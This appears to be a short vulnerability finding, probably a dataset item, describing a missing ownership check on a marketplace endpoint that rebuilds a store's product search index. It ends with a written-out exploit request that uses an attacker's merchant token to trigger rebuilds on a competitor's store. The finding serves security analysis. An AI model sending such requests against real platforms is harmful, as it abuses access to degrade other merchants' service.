diagnosis: The handler takes storeId from the request body and commands the cluster master to rebuild the product search index. It does not verify that the authenticated merchant owns storeId, permitting rival merchants to trigger resource-intensive index rebuilds on competitor stores, degrading their catalog performance.
exploit_request:
POST /api/store/search-index/rebuild HTTP/1.1
Host: marketplace.ecommerce.com
Authorization: Bearer <attacker_merchant_key>
Content-Type: application/json

{"storeId": "str_competitor_electronics_01"}
